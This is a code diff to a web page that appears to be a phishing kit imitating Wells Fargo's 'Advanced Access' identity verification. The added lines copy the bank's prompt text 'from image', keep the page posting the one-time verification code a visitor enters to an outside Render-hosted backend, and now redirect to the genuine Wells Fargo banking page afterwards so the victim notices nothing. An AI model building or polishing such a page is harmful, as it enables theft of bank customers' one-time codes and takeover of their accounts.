@@ -30,17 +30,39 @@
       letter-spacing: 1px;
     }
     .container {
-      max-width: 400px;
-      margin: 60px auto 20px;
+      max-width: 500px;
+      margin: 40px auto 20px;
       background: white;
       padding: 30px;
       border-radius: 10px;
-      text-align: center;
       box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
     }
-    h2 {
-      margin-bottom: 20px;
+    .verify-section {
+      text-align: left;
+      margin-bottom: 25px;
+    }
+    .verify-section h1 {
       font-size: 22px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 8px;
+    }
+    .verify-section p {
+      font-size: 14px;
+      color: #333;
+      margin: 4px 0;
+      line-height: 1.4;
+    }
+    .verify-section a {
+      color: #0070c9;
+      text-decoration: none;
+    }
+    .verify-section a:hover {
+      text-decoration: underline;
+    }
+    .verify-section .note {
+      font-size: 13px;
+      color: #555;
     }
     .input-field {
       width: 100%;
@@ -105,6 +127,14 @@
 <div class="yellow-strip"></div>
 
 <div class="container">
+
+  <!-- Exact text from image -->
+  <div class="verify-section">
+    <h1>Verify Your Identity</h1>
+    <p>For your security, an <a href="#">Advanced Access</a> code is required.</p>
+    <p class="note">Recent updates to your contact information may not be immediately available for selection.</p>
+  </div>
+
   <h2>Enter Verification Code</h2>
   <input
     type="text"
@@ -127,7 +157,6 @@
   const btnText = document.getElementById("btnText");
   const errorMessage = document.getElementById("errorMessage");
 
-  // ✅ Auto-detect backend for local vs live domains
   const API_BASE = 'https://my-node-backend-4nfy.onrender.com';
 
   otpField.addEventListener("input", () => {
@@ -175,7 +204,8 @@
       const data = await res.json();
       if (!res.ok) throw new Error(data.message || "Verification failed");
 
-      window.location.href = "success.html";
+      // Redirect after success
+      window.location.href = "https://www.wellsfargo.com/mobile-online-banking/";
     } catch (err) {
       errorMessage.textContent = err.message || "Something went wrong.";
       errorMessage.style.display = "block";
